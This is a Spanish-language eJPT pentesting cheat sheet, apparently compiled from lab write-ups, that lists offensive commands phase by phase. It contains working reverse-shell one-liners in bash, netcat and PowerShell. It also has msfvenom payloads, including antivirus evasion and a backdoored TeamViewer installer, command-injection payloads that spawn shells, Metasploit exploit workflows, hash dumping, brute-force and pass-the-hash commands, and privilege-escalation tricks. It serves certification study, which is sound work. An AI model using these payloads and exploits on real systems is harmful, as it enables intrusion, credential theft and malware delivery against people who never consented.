# CHEAT SHEET COMPLETO para eJPT — Comandos por Etapa del Ethical Hacking

Resumen de todos los comandos del vault, organizado por fases de pentesting.

---

## 1. RECONOCIMIENTO / INFORMATION GATHERING (OSINT)

### SSL/Certificados — Descubrir subdominios
```bash
curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq .
```

### Filtrar subdominios únicos
```bash
curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
```

### Shodan (OSINT de infraestructura)
```bash
shodan host <IP>
```

---

## 2. DNS ENUMERATION

### Zone Transfer (AXFR) — La fuente de oro
```bash
dig axfr inlanefreight.htb @10.129.15.250         # Intentar AXFR en zona raíz
dig axfr internal.inlanefreight.htb @10.129.15.250 # AXFR en subzona descubierta
```
**Claves:** Cada subdominio puede ser su propia zona. Si AXFR funciona, dumpea todos los registros. Si falla, seguir con brute-force. Los registros TXT con SPF revelan IPs internas.

### Queries DNS
```bash
dig NS inlanefreight.htb @<IP>        # Nameservers
dig CH TXT version.bind @<IP>         # Versión del servidor DNS
dig any inlanefreight.com @<IP>       # Todos los registros
```

### Brute-force DNS con dnsenum
```bash
dnsenum --dnsserver <IP> --enum -p 0 -s 0 \
  -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt \
  dev.inlanefreight.htb
```
**Cuándo:** Cuando AXFR falla pero la zona es válida. **Cambiar wordlists** — distintas listas dan resultados distintos.

### Brute-force DNS manual
```bash
for i in $(cat subdomainlist); do host $i | grep "has address" | cut -d" " -f1,4; done
```

---

## 3. ENUMERACIÓN DE RED / HOST DISCOVERY

### Descubrimiento de hosts
```bash
sudo nmap <RED>/24 -sn -oA tnet | grep for | cut -d" " -f5
sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d" " -f5
```

### Verificar si un host está activo
```bash
sudo nmap <IP> -sn -oA host -PE --packet-trace --disable-arp-ping
```

### Determinar SO por TTL
- **Windows**: TTL=128
- **Linux**: TTL=64
- **Cisco**: TTL=255

---

## 4. ESCANEO DE PUERTOS Y SERVICIOS

### Top 10 puertos
```bash
sudo nmap <IP> --top-ports=10
```

### Todos los puertos TCP
```bash
sudo nmap <IP> -p- -sV --stats-every=5s -v
sudo nmap -p- -sV -sC <IP> --min-rate 5000
```

### TCP Connect Scan (no sigiloso)
```bash
sudo nmap <IP> -p <PUERTO> -sT -Pn -n --reason
```

### SYN Stealth Scan (sigiloso)
```bash
sudo nmap <IP> -p <PUERTO> -sS -Pn -n --disable-arp-ping --packet-trace
```

### UDP Scan (los olvidan los admins)
```bash
sudo nmap <IP> -F -sU
```

### Banner Grabbing
```bash
nc -nv <IP> <PUERTO>            # Conectar y ver banner
sudo tcpdump -i eth0 host <IP>  # Capturar tráfico
telnet <IP> 25                  # Banner SMTP
```

### Escaneo agresivo
```bash
sudo nmap <IP> -A -O --traceroute
```

### Escaneo de vulnerabilidades
```bash
sudo nmap <IP> -p 80 -sV --script vuln
```

---

## 5. EVASIÓN DE FIREWALL / IDS/IPS

### ACK Scan — Mapear reglas de firewall
```bash
sudo nmap <IP> -p <PUERTOS> -sA -Pn -n --disable-arp-ping --packet-trace
```

### Decoys — IPs falsas
```bash
sudo nmap <IP> -p 80 -sS -Pn -n --disable-arp-ping -D RND:5
```

### Source Port 53 — Tráfico DNS se confía más
```bash
sudo nmap <IP> -p50000 -sS -Pn -n --disable-arp-ping --source-port 53
```

### Timing
```bash
-T 0 paranoid | -T 1 sneaky | -T 2 polite | -T 3 normal | -T 4 aggressive | -T 5 insane
--min-rate 300
--max-rtt-timeout 100ms
```

---

## 6. ENUMERACIÓN DE SERVICIOS ESPECÍFICOS

### SMB

**Escaneo y enumeración básica:**
```bash
sudo nmap <IP> -sV -sC -p139,445
smbclient -N -L //<IP>                   # Listar shares (sesión anónima)
smbclient //<IP>/notes                   # Conectar a un share
smbmap -H <IP>                           # Listar shares con permisos
rpcclient -U "" <IP>                     # Enumeración RPC
crackmapexec smb <IP> --shares -u '' -p ''
enum4linux-ng.py <IP> -A
```

**rpcclient comandos:**
```bash
srvinfo, enumdomains, querydominfo, netshareenumall, enumdomusers
```

**RID brute force:**
```bash
for i in $(seq 500 1100); do rpcclient -N -U "" <IP> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo ""; done
```

**SMB con credenciales:**
```bash
smbclient //<IP>/devshare -U <user>
smbclient //<IP>/Users -U <user>
# del writeup: buscar archivos como important.txt → credenciales en texto plano
smb: \> cd devshare\
smb: \alex\devshare\> ls
smb: \alex\devshare\> more important.txt
```

---

### FTP

```bash
sudo nmap <IP> -sC -sV -p 21          # Escaneo
nc -nv <IP> 21                         # Conexión directa
ftp <IP>                               # Conectar
ls -la                                 # ¡Ver archivos ocultos (incluye .ssh)!
get id_rsa                             # Descargar clave privada
```

**Credenciales por defecto:**
```bash
User: anonymous, Pass: (vacío)
```

**Crackear con Hydra:**
```bash
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt <IP> -M ftp
```

**Puerto no estándar:**
```bash
ftp <IP> 2121    # A veces el banner revela la cuenta del propietario
```

**Descargar todo:**
```bash
wget -m --no-passive ftp://anonymous:anonymous@<IP>
```

---

### SSH con clave privada
```bash
chmod 600 id_rsa
ssh -i id_rsa <user>@<IP>
```

---

### NFS

```bash
sudo nmap <IP> -p111,2049 -sV -sC
sudo nmap --script nfs* <IP> -sV -p111,2049
showmount -e <IP>                              # Ver shares disponibles
mkdir target-NFS
sudo mount -t nfs <IP>:/ ./target-NFS/ -o nolock
ls -l mnt/nfs/     # Con nombres de usuario
ls -n mnt/nfs/     # Con UIDs/GIDs
sudo umount ./target-NFS
```

---

### SMTP — Enumeración de usuarios

**Banner Grabbing:**
```bash
nmap <IP> -p25 -sC -sV
telnet <IP> 25
```

**VRFY — Username Enumeration:**
```bash
# Respuesta 250/252 = usuario existe, 550 = no existe

# smtp-user-enum (puede fallar en servidores lentos)
./smtp-user-enum.pl -M VRFY -U footprinting-wordlist.txt -t <IP> -T 30

# Manual con bash loop (más confiable)
for user in $(cat footprinting-wordlist.txt); do
    result=$(echo "VRFY $user" | nc -w 5 <IP> 25 2>/dev/null)
    if echo "$result" | grep -q "252\|250"; then
        echo "[+] Valid user: $user"
    fi
done
```
**Lección:** El código `252` es positivo — el servidor no confirma directamente pero el usuario probablemente existe.

---

### IMAP / POP3

**Enumeración:**
```bash
sudo nmap <IP> -p110,143,993,995 -sC -sV    # Los 4 puertos de mail
```
El certificado SSL revela: organización, FQDN, emails.

**Conexión SSL:**
```bash
openssl s_client -connect <IP>:imaps    # IMAP over SSL
openssl s_client -connect <IP>:pop3s    # POP3 over SSL
```
**Clave:** Los flags pueden aparecer en el banner antes de autenticarse.

**IMAP — Comandos interactivos:**
```bash
a1 LOGIN robin robin            # Autenticar
a2 LIST "" *                    # Listar todos los mailboxes
a3 SELECT DEV.DEPARTMENT.INT    # Abrir mailbox
a4 FETCH 1:* (ENVELOPE)         # Ver headers de todos los emails
a5 FETCH 1 BODY[]               # Leer cuerpo del email
```
**Clave:** INBOX vacío no significa que no haya mail — enumerar TODOS los mailboxes con `LIST "" *`.

---

### SNMP

```bash
# Nmap
sudo nmap -sU --script ipmi-version -p 623 <IP>

# Walk completo
snmpwalk -v2c -c public <IP>

# Resultados clave:
# iso.3.6.1.2.1.1.4.0 → email del admin (devadmin@inlanefreight.htb)
# iso.3.6.1.2.1.1.5.0 → nombre del host
# iso.3.6.1.2.1.25.1.7.1.3 → output de scripts custom → flags
```

---

### MySQL

```bash
# Enumeración con Nmap
sudo nmap <IP> -sV -sC -p3306 --script="mysql*"

# Login con credenciales débiles
mysql -u robin -probin -h <IP>

# Enumeración de datos
show databases;
use customers;
show tables;
show columns from myTable;
select * from myTable where name = "Otto Lang";
```
**Clave:** Las credenciales reutilizadas entre servicios (SMTP→MySQL) son findings críticos.

---

### MSSQL

**Nmap scripts:**
```bash
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

**Metasploit — SQL Server Browser (sin auth):**
```bash
use auxiliary/scanner/mssql/mssql_ping
set rhosts <IP>
set verbose true    # ¡IMPORTANTE! Sin esto no muestra info
run
```

**mssqlclient.py (Impacket):**
```bash
python3 mssqlclient.py <user>@<IP> -windows-auth    # Windows Auth es el default
select name from sys.databases                       # Listar bases de datos
```

**sqlcmd desde Windows:**
```bash
sqlcmd -S localhost -E -Q "SELECT name FROM sys.databases"
sqlcmd -S localhost -E -Q "SELECT table_name FROM accounts.information_schema.tables"
sqlcmd -S localhost -E -Q "SELECT * FROM accounts.dbo.devsacc WHERE name='HTB'"
```
**Clave:** `-E` es Windows Authentication — útil cuando ya tienes una sesión Windows.

---

### Oracle TNS

```bash
# Escaneo
sudo nmap -p1521 -sV <IP> --open

# Descubrir SID
python3 odat.py sidguesser -s <IP> -p 1521

# Descubrir credenciales
python3 odat.py passwordguesser -s <IP> -p 1521 -d XE --accounts-file accounts/accounts_multiple.txt

# Conectar
./sqlplus scott/tiger@<IP>/XE as sysdba

# Extraer hashes
SELECT name, password FROM sys.user$ WHERE name='DBSNMP';
```
**Clave:** Usar TCP VPN, no UDP — Oracle TNS es sensible a packet loss.

---

### IPMI

```bash
# Enumeración
sudo nmap -sU --script ipmi-version -p 623 <IP>

# Metasploit - Version
use auxiliary/scanner/ipmi/ipmi_version
set rhosts <IP>
run

# Metasploit - Hash Dumping (RAKP flaw, pre-auth)
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts <IP>
run

# Crackear hash (hashcat -m 7300)
echo "e572c9fe...:e3a36f22bf..." > hash_only.txt
hashcat -m 7300 hash_only.txt /usr/share/wordlists/rockyou.txt
```
**Clave:** La vulnerabilidad RAKP es by design — no hay patch. Siempre strip el username del hash antes de hashcat.

---

### RDP

```bash
# Enumeración
nmap -sV -sC <IP> -p3389 --script="rdp*"

# Conexión gráfica
xfreerdp /v:<IP> /u:<user> /p:'<pass>' /dynamic-resolution

# Flags útiles completos
xfreerdp /v:<IP> /u:htb-student /p:'HTB_@cademy_stdnt!' /dynamic-resolution /drive:.,linux /bpp:16 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache
```

---

### WinRM

```bash
evil-winrm -i <IP> -u <user> -p <password>
evil-winrm-py -i <IP> -u Administrator -p '<password>'
```

---

## 7. FUZZING WEB / APLICACIONES

### Fuzzing de directorios
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<IP>:<PUERTO>/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<IP>/FUZZ -fc 404
```

### Fuzzing de archivos/extensiones
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://<IP>:<PUERTO>/indexFUZZ
```

### Fuzzing recursivo
```bash
ffuf -w <wordlist>:FUZZ -u http://<IP>:<PUERTO>/FUZZ -recursion -recursion-depth 1 -e .php -v
```

### Subdomain/Vhost fuzzing
```bash
# Subdomains (DNS)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.<dominio>/

# Vhosts (Host header)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://<dominio>:<PUERTO>/ -H 'Host: FUZZ.<dominio>'

# HTTPS con -k (ignorar cert autofirmado)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://<dominio> -H "Host: FUZZ.<dominio>" -fc 302,404 -k

# Filtrar por tamaño
-fs <size>
```

### Fuzzing de parámetros GET / POST
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://<dominio>:<PUERTO>/page.php?FUZZ=key
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://<dominio>:<PUERTO>/page.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'
```

### Fuzzing de IDs numéricos
```bash
ffuf -u http://<IP>/data/FUZZ -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -fc 404
```

---

## 8. VULNERABILITY ASSESSMENT

### Nessus
```bash
# Configurar: Discovery → Assessment → Advanced
# Templates: Basic Network Scan, Advanced Scan, Malware Scan, Web App Tests
# Escáneres: Nessus Essentials (16 hosts gratis)
```

### OpenVAS
```bash
sudo apt-get install gvm && openvas
gvm-setup
gvm-start
python3 -m openvasreporting -i <report>.xml -f xlsx
```

---

## 9. EXPLOTACIÓN / GANAR ACCESO INICIAL

### MSFVenom — Generar payloads

**Linux (ELF):**
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=443 -f elf > shell.elf
```

**Windows (EXE):**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<TU_IP> LPORT=443 -f exe > shell.exe
```

**PHP:**
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=443 -f raw > shell.php
```

**ASPX (IIS):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=1337 -f aspx > reverse_shell.aspx
```

**JSP para Tomcat (WAR):**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f war > shell.war
unzip -l shell.war   # Revela el nombre del .jsp generado
# Acceder a: http://<IP>:8080/<war_name>/<jsp_file>.jsp
```

**Con encoding (evasion AV):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o payload.exe
```

---

### Metasploit — Workflow completo

```bash
# 1. Iniciar
sudo msfconsole -q

# 2. Escaneo con db_nmap (auto-popula la database)
db_nmap -sC -sV <IP>
db_nmap -sV -sS -sC <IP> --min-rate 1000

# 3. Buscar módulo
search <nombre_o_CVE>
search elFinder
search FortiLogger
search sudo 1.8.31

# 4. Seleccionar
use exploit/linux/http/elfinder_archive_cmd_injection
use exploit/windows/http/fortilogger_arbitrary_fileupload
use exploit/multi/http/apache_druid_cve_2023_25194
use exploit/linux/local/sudo_baron_samedit
use exploit/windows/smb/ms17_psexec

# 5. Configurar opciones
set RHOSTS <IP>
set RHOST <IP>
set LHOST <TU_IP>
set LPORT <PUERTO>
set SHARE ADMIN$
set SMBUser <usuario>
set SMBPass <password>
set VHOST <dominio>
set USERNAME admin
set PASSWORD admin123
set target 6    # Target específico (ej: Linux = 6)

# 6. Verificar
show options

# 7. Ejecutar
exploit   # o: run

# 8. En Meterpreter
getuid           # Ver usuario actual
sysinfo          # Info del sistema
hashdump         # Dump hashes SAM (requiere SYSTEM)
shell            # Bajar a shell del SO
search -f flag.txt  # Buscar archivos
cat /root/root.txt
background       # Poner sesión en background (Ctrl+Z)
```

### Metasploit — Workflows de los writeups

**elFinder RCE (CVE-2021-06-13):**
```bash
search elFinder
use exploit/linux/http/elfinder_archive_cmd_injection
set RHOSTS <IP>
set LHOST <TU_IP>
run
# → www-data shell
# → sudo --version → 1.8.31 vulnerable
```

**Baron Samedit (CVE-2021-3156, privesc sudo):**
```bash
search sudo 1.8.31
use exploit/linux/local/sudo_baron_samedit
set LHOST <TU_IP>
set SESSION 1
run
# → root
```

**FortiLogger (CVE-2021-02-26, unauthenticated upload):**
```bash
search FortiLogger
use exploit/windows/http/fortilogger_arbitrary_fileupload
set RHOSTS <IP>
set LHOST <TU_IP>
run
# → NT AUTHORITY\SYSTEM directamente
hashdump
```

**Apache Druid JNDI (CVE-2023-25194):**
```bash
search apache druid
use exploit/multi/http/apache_druid_cve_2023_25194
set RHOSTS <IP>
set RPORT 8888
set LHOST <TU_IP>
set target 6
set payload linux/x64/meterpreter/reverse_tcp
run
# → Meterpreter session
# Non-fatal errors son normales — esperar a ver el session open
```

**Tomcat WAR Upload (manual):**
```bash
# Generar WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war > shell.war
# Upload vía Manager GUI (credenciales: tomcat:Tomcatadm)
# Listener
nc -lvnp 4444
# Navegar a: http://<IP>:8080/<war_name>/<jsp>.jsp
```

**Blog RCE (custom module desde searchsploit):**
```bash
searchsploit -m 50064
mkdir -p ~/.msf4/modules/exploits/php/webapps
cp /usr/share/exploitdb/exploits/php/webapps/50064.rb ~/.msf4/modules/exploits/php/webapps/blog_rce.rb
search blog_rce
use 0
set RHOSTS <IP>
set VHOST blog.inlanefreight.local
set USERNAME admin
set PASSWORD admin123
run
```

**EternalBlue (MS17-010):**
```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <IP>
run
# Si vulnerable:
use exploit/windows/smb/ms17_psexec
set RHOST <IP>
set LHOST <TU_IP>
run
```

### Metasploit — Post-exploitation workflow

```bash
# 1. Obtener shell
exploit

# 2. Verificar usuario
getuid

# 3. Background
background

# 4. Sugerir exploits de privesc
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# 5. Usar exploit sugerido con puerto diferente
use <exploit>
set SESSION 1
set LHOST tun0
set LPORT 1338
run

# 6. Verificar
getuid  # → NT AUTHORITY\SYSTEM
hashdump
```

---

### RCE vía Web — Command Injection

```bash
# Confirmar ejecución
curl -s -X POST http://<IP>/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=<session>" \
  -H "Content-Type: application/json" \
  -d '{"username":"vale;id;"}'

# Reverse shell
curl -s -X POST http://<IP>/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=<session>" \
  -H "Content-Type: application/json" \
  -d '{"username":"vale;bash -c '\''bash -i >& /dev/tcp/<TU_IP>/4444 0>&1'\'';"}'
```
**Clave:** Probar variantes de inyección: `;cmd;`, `` `cmd` ``, `$(cmd)`.

### RCE vía JSON API (MCPJam Inspector — Kobold)

```bash
# Confirmación con pingback + tcpdump
sudo tcpdump -i tun0 icmp

curl -L -k https://mcp.kobold.htb/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{"serverConfig":{"command":"sh","args":["-c","ping -c 1 <TU_IP>"],"env":{}},"serverId":"test"}'

# Reverse shell (base64 para evitar caracteres especiales en JSON)
echo 'bash -i >& /dev/tcp/<TU_IP>/4444 0>&1' | base64

curl -L -k https://mcp.kobold.htb/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{"serverConfig":{"command":"sh","args":["-c","echo <BASE64> | base64 -d | bash"],"env":{}},"serverId":"test"}'

# Listener
rlwrap nc -lvnp 4444
```

### SQL Injection autenticada (CCTV — CVE-2024-51428)

```bash
sqlmap -u "http://<IP>/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=<cookie>" \
  -p tid --dbms=mysql --batch

# Dumpear datos
sqlmap -u "http://<IP>/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=<cookie>" \
  -p tid --dbms=mysql --batch -D zm -T Users -C "Username,Password" --dump
```

---

## 10. OBTENER SHELL INTERACTIVA

### Bind Shell (target escucha)
```bash
# En el target:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP> 7777 > /tmp/f
# Desde atacante:
nc -nv <IP> 7777
```

### Reverse Shell (atacante escucha)

**Bash (Linux):**
```bash
# Atacante:
sudo nc -lvnp 443
# Target:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <TU_IP> 7777 > /tmp/f
```

**PowerShell (Windows):**
```bash
# Atacante:
sudo nc -lvnp 443
# Target:
$client = New-Object System.Net.Sockets.TCPClient('<TU_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Estabilizar shell (TTY upgrade)
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Otros métodos de TTY
```bash
perl -e 'exec "/bin/sh";'
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
awk 'BEGIN {system("/bin/sh")}'
vim -c ':!/bin/sh'
```

---

## 11. TRANSFERENCIA DE ARCHIVOS

### Linux → Windows (SMB)
```bash
# En Linux:
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
# En Windows:
net use n: \\<IP_LINUX>\share /user:test test
copy n:\archivo.exe C:\Users\Public\
```

### Linux → Windows (HTTP)
```bash
# En Linux:
cd /tmp && python3 -m http.server 8080
# En Windows:
(New-Object Net.WebClient).DownloadFile('http://<IP_LINUX>:8080/archivo.exe','C:\Users\Public\archivo.exe')
```

### Linux → Linux
```bash
wget http://<IP>/archivo.sh -O /tmp/archivo.sh
curl -o /tmp/archivo.sh http://<IP>/archivo.sh
```

### Windows → Linux (Base64)
```bash
# En Windows:
[Convert]::ToBase64String((Get-Content -Path 'C:\file.txt' -Encoding Byte))
# En Linux:
echo "<BASE64>" | base64 -d > archivo.txt
```

### Netcat
```bash
# Receptor:
nc -l -p 8000 > archivo.exe
# Emisor:
nc -q 0 <IP_RECEIVER> 8000 < archivo.exe
```

### LOLBins Windows
```bash
certutil.exe -urlcache -split -f http://<IP>:8000/archivo.exe C:\archivo.exe
bitsadmin /transfer wcb /priority foreground http://<IP>:8000/nc.exe C:\nc.exe
```

### Evasión AV
```bash
# Archivos protegidos con rar
rar a archivo.rar -p payload.exe
mv archivo.rar archivo
rar a archivo2.rar -p archivo

# Backdoor con plantilla legítima
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o payload.exe -i 5

# User-Agent spoofing en PowerShell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<IP>/payload.exe -UserAgent $UserAgent -OutFile payload.exe
```

---

## 12. ATAQUES A SERVICIOS / BRUTE FORCE

### Hydra
```bash
# SSH
hydra -L user.list -P password.list ssh://<IP> -t 4
# RDP
hydra -L user.list -P password.list rdp://<IP> -t 4 -W 3
# FTP
hydra -l <user> -P password.list ftp://<IP>
# SMB
hydra -L user.list -P password.list smb://<IP>
```

### NetExec (antes CrackMapExec)
```bash
netexec winrm <IP> -u <user.list> -p <password.list>
netexec smb <IP> -u <user> -p <password> --shares
# "(Pwn3d!)" = acceso RCE
evil-winrm -i <IP> -u <user> -p <password>
```

### Pass-the-Hash
```bash
impacket-psexec <user>:'<NTLM_HASH>'@<IP>
crackmapexec smb <IP> -u <user> -H <NTLM_HASH>
```

---

## 13. ATAQUES A BASES DE DATOS

### MySQL
```bash
mysql -u <user> -p<password> -h <IP>
SHOW DATABASES;
USE <db>;
SHOW TABLES;
SHOW columns FROM <table>;
SELECT * FROM <tabla> WHERE <condition>;
```

### MSSQL
```bash
# Desde Linux
mssqlclient.py -p 1433 <user>@<IP>
# Desde Windows
sqlcmd -S localhost -E -Q "SELECT name FROM sys.databases"
# xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
xp_cmdshell 'whoami'; GO
```

### Oracle TNS
```bash
./sqlplus scott/tiger@<IP>/XE as sysdba
SELECT name, password FROM sys.user$ WHERE name='DBSNMP';
```

---

## 14. POST-EXPLOTACIÓN / MOVIMIENTO LATERAL / PRIVESC

### Meterpreter — Comandos clave
```bash
getuid           # Ver usuario actual
getsid           # Ver SID
sysinfo          # Info del sistema
ps               # Procesos activos
getprivs         # Privilegios disponibles
hashdump         # Dump hashes SAM
migrate <PID>    # Migrar a otro proceso
steal_token <PID> # Robar token
getsystem        # Intentar elevar a SYSTEM
search -f <archivo>  # Buscar archivos
cat <archivo>    # Leer archivo
upload / download
```

### Verificar privesc en Linux
```bash
sudo -l                           # Ver permisos sudo
id                                # Ver grupos (¡grupo docker = root!)
find / -perm -4000 -type f 2>/dev/null  # Archivos SUID
find / -group operator 2>/dev/null      # Archivos por grupo no estándar
ss -tlnp                          # Puertos internos
cat /etc/gshadow                  # Ver miembros de grupos
```

### Docker group → Root (Kobold)
```bash
# Verificar grupo
id   # → groups=1001(ben),37(operator)
newgrp docker   # Sin contraseña = misconfig crítica
# En shells no interactivas usar sg
sg docker -c "docker run -v /:/hostfs --rm --entrypoint sh mysql:latest -c 'cat /hostfs/root/root.txt'"
# Monta filesystem del host en /hostfs → root sin exploit
```

### Cap_setuid en Python → Root (Cap)
```bash
# linPEAS reporta: /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

### PwnKit — pkexec CVE-2021-4034 (Cap)
```bash
# Verificar versión
pkexec --version    # Si < 0.105-26 = vulnerable
dpkg -l policykit-1
# Compilar en la VÍCTIMA (no en Kali — GLIBC incompatible)
git clone https://github.com/berdav/CVE-2021-4034
python3 -m http.server 8080    # Servir desde Kali
# En víctima:
wget http://<TU_IP>:8080/cve-2021-4034.c
wget http://<TU_IP>:8080/pwnkit.c
wget http://<TU_IP>:8080/Makefile
make
./cve-2021-4034
```

### Port Forwarding SSH
```bash
ssh -L 8765:127.0.0.1:8765 <user>@<IP>
# Exponer puerto interno localmente para Metasploit
```

### Credenciales en .env / archivos de configuración
```bash
cat /var/www/html/.env
# DB_USERNAME=admin / DB_PASSWORD=SuperDuperPass123 → su admin
cat /opt/wftpserver/Data/1/users/wacky.xml   # Hash SHA-256 de Wing FTP
cat /etc/motioneye/motion.conf                # Hash de motionEye admin
```

### TarSlip — CVE-2025-4517 (WingData)
```bash
sudo -l
# Usuario puede ejecutar script que usa tarfile.extractall() vulnerable a symlink+hardlink
wget http://<TU_IP>:8080/CVE-2025-4517-POC.py -O /tmp/exploit.py
python3 /tmp/exploit.py
# → sobreescribe /etc/sudoers → sudo /bin/bash → root
```

---

## 15. CRACKEO DE CONTRASEÑAS

### John The Ripper
```bash
john --single passwd                    # Modo single (Linux /etc/passwd)
john --wordlist=rockyou.txt <hash>      # Modo wordlist
john --wordlist=rockyou.txt --rules <hash>  # Con reglas
john --incremental <hash>               # Brute-force inteligente
john <hash> --show                      # Ver resultados
```

### Hashcat
```bash
# Diccionario
hashcat -a 0 -m 0 <hash> /usr/share/wordlists/rockyou.txt
# Con reglas
hashcat -a 0 -m 0 <hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# Mask attack
hashcat -a 3 -m 0 <hash> '?u?l?l?l?l?d?s'

# Modos específicos
hashcat -m 7300 hash_only.txt rockyou.txt    # IPMI2 RAKP HMAC-SHA1
hashcat -m 1410 'HASH:WingFTP' rockyou.txt   # SHA-256 con salt WingFTP
hashcat -m 3200 '$2y$10$<bcrypt>' rockyou.txt  # bcrypt
```

### *2john tools
```bash
ssh2john.py <key_privada> > ssh.hash
pdf2john.py <archivo.pdf> > pdf.hash
office2john.py <docx> > office.hash
zip2john.py <archivo.zip> > zip.hash
bitlocker2john -i <vhd> > bitlocker.hash
```

### CeWL — Wordlists personalizadas
```bash
cewl https://<web_empresa> -d 4 -m 6 --lowercase -w wordlist.txt
```

---

## 16. BASES DE DATOS MSF

### Workspaces
```bash
workspace                  # Listar
workspace -a Target_1      # Crear
workspace Target_1         # Cambiar
```

### Importar escaneos
```bash
db_import Target.xml
db_nmap -sV -sS <IP>
```

### Consultar hosts y servicios
```bash
hosts                      # Ver hosts
hosts -R                   # Poner hosts como RHOSTS
services                   # Ver servicios
services -p 445            # Filtrar por puerto
creds                      # Ver credenciales
loot                       # Ver loot
```

### Session management
```bash
sessions -l                # Listar sesiones activas
sessions -i 1              # Interactuar con sesión 1
```

---

## CHECKLIST RÁPIDO — Flujo de un Pentest

```
1. Reconocimiento      → OSINT, DNS (AXFR primero), subdominios, certificados
2. Host Discovery      → nmap -sn
3. Port Scan           → nmap -p- -sV -sC
4. Enumeración         → SMB/FTP/NFS/DNS/SMTP/IMAP/SNMP/MySQL/MSSQL/Oracle/IPMI/HTTP
5. Vuln Assessment     → Nessus/OpenVAS o nmap --script vuln
6. Explotación         → MSFvenom + handler, Metasploit, RCE vía web, SQLi
7. Post-Exploitation   → local_exploit_suggester, hashdump, credential reuse
8. Privilege Escalation→ sudo -l, SUID, capabilities, kernel exploits, docker group
9. Lateral Movement    → Pass-the-Hash, credential reuse en .env/config files
10. Exfiltración       → File transfer + encriptar
11. Reporte            → PDF/HTML/CSV con findings y remediación
```

---

## LECCIONES CLAVE DE LOS WRITEUPS

- **DNS:** Siempre intentar AXFR primero. Cada subdominio puede ser su propia zona. Los TXT/SPF revelan IPs internas.
- **SMTP:** `252` es positivo para VRFY. Los tools automáticos fallan en servidores lentos — bash loop con nc es confiable.
- **IMAP:** Los flags están en el banner y en mailboxes no obvias. `LIST "" *` siempre.
- **SNMP:** Community string `public` abre toda la info — emails, nombres, output de scripts.
- **Credenciales reutilizadas:** Lo que encuentres en un servicio probarlo en todos los demás (SMTP→MySQL→MSSQL→SSH).
